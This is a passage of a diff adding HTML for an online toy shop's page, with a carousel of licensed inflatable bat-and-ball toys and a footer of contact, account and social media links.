+-->                                             
+<img src="http://www.esscosa.com/media/catalog/product/1/1/11122.JPG" style="max-width: 100px; max-height:200px "/>                                             
+                                             
+                                             
+                                             
+                                             
+                                        <div class="le-slide-img"><h4>
+                                            Hello Kitty Tapball - Inflatable Bat and Ball Childrens Toy                                        </h4></div>
+                                                                            </a>
+                                </li>
+                                                                <li><a  href="http://www.esscosa.com/tmnt-tapball-inflatable-disney-bat-and-ball-childrens-toy.html" 
+                                        target="">
+<!--<img src="http://www.esscosa.com/media/catalog/product/t/a/tap_ball_tmnt_1.jpg" style="max-width: 80px; max-height:80px "/>
+-->                                             
+<img src="http://www.esscosa.com/media/catalog/product/t/a/tap_ball_tmnt_1.jpg" style="max-width: 100px; max-height:200px "/>                                             
+                                             
+                                             
+                                             
+                                             
+                                        <div class="le-slide-img"><h4>
+                                            Ninja Turtles Tapball - Inflatable Bat and Ball Childrens Toy                                        </h4></div>
+                                                                            </a>
+                                </li>
+                                                                <li><a  href="http://www.esscosa.com/peppa-tapball-inflatable-disney-bat-and-ball-childrens-toy.html" 
+                                        target="">
+<!--<img src="http://www.esscosa.com/media/catalog/product/t/a/tap_ball_peppa.jpg" style="max-width: 80px; max-height:80px "/>
+-->                                             
+<img src="http://www.esscosa.com/media/catalog/product/t/a/tap_ball_peppa.jpg" style="max-width: 100px; max-height:200px "/>                                             
+                                             
+                                             
+                                             
+                                             
+                                        <div class="le-slide-img"><h4>
+                                            Peppa Pig Tapball - Inflatable Bat and Ball Childrens Toy                                        </h4></div>
+                                                                            </a>
+                                </li>
+                                                                <li><a  href="http://www.esscosa.com/frozen-tapball-inflatable-disney-bat-and-ball-childrens-toy.html" 
+                                        target="">
+<!--<img src="http://www.esscosa.com/media/catalog/product/t/a/tap_ball_frozen1.jpg" style="max-width: 80px; max-height:80px "/>
+-->                                             
+<img src="http://www.esscosa.com/media/catalog/product/t/a/tap_ball_frozen1.jpg" style="max-width: 100px; max-height:200px "/>                                             
+                                             
+                                             
+                                             
+                                             
+                                        <div class="le-slide-img"><h4>
+                                            Frozen Tapball - Inflatable Disney Bat and Ball Childrens Toy                                        </h4></div>
+                                                                            </a>
+                                </li>
+                                </ul><br style="clear: both;"/>
+            <nav>
+                                    <a group="4" href="#" >
+                        Toys                    </a>
+
+                                        <a group="6" href="#" >
+                        Toys                    </a>
+
+                                        <a group="5" href="#" >
+                        Toys                    </a>
+
+                                </nav>
+
+        </div>
+    </div>
+</div></div>                </div>
+            </div>
+        </div>
+                <div class="footer-container">
+    <div class="footer">
+        		<!--
+        <address class="copyright">&amp;copy; 2014 Magento Demo Store. All Rights Reserved.</address>
+		-->
+				<div id="footerarea">
+<div id="contact" class="lfloat footer">
+<h3 class="foottitle">CONTACT DETAILS</h3>
+<p class="foottext"><span><br /></span>Tel: 03330143938</p>
+<p class="foottext" align="left"><a href="mailto:info@esscosa.com">info@esscosa.com</a></p>
+</div>
+<div id="home" class="lfloat footer">
+<h3 class="foottitle">INFORMATION</h3>
+<a href="/about-us">About Us</a> <a href="/returns">Returns</a> <a href="/payment">Payment</a> <a href="/delivery">Delivery</a> <a href="/privacy">Privacy Policy</a> <a href="/terms-condition">Terms &amp; Condition</a> <a href="/contact-us">Contact Us</a></div>
+<div id="product" class="lfloat footer">
+<h3 class="foottitle">MY ACCOUNT</h3>
+<a href="#">Sign In</a> <a href="#">View cart</a> <a href="#">My Wishlist</a> <a href="#">Track My Order</a> <a href="#">Help</a></div>
+<div id="login" class="lfloat footer">
+<h3 class="foottitle">SHOPPING</h3>
+<a href="#">New Product</a> <a href="#">Top sale</a> <a href="#">Special</a><a href="#">Suppliers</a><a href="#">Sales</a><a href="#">Customer Service</a></div>
+<div id="utility" class="lfloat footer">
+<div class="footsocial">
+<h3 class="foottitle">FOLLOW US</h3>
+<a href="https://www.facebook.com/pages/Escossa/332278113639648?ref=hl" target="_blank"><img src="http://www.esscosa.com/media/wysiwyg/image/facebook.png" alt="" />Facebook</a> <a href="https://twitter.com/esscosauk" target="_blank"><img src="http://www.esscosa.com/media/wysiwyg/image/twitter.png" alt="" />Twitter</a> <a href="https://plus.google.com/u/0/108307495419120961187/posts
+" target="_blank"><img src="http://www.esscosa.com/media/wysiwyg/image/gplus.png" alt="" />Google Plus</a> <a class="linkedin" style="float: left;" href="https://www.linkedin.com/profile/view?id=398164323&amp;trk=spm_pic
+" target="_blank"><img src="http://www.esscosa.com/media/wysiwyg/image/linkedin.png" alt="" />Linkedin</a></div>
+</div>
+</div>		
+    </div>
+</div>
+                
+
+    </div>
+</div>
+</body>
+</html>
+
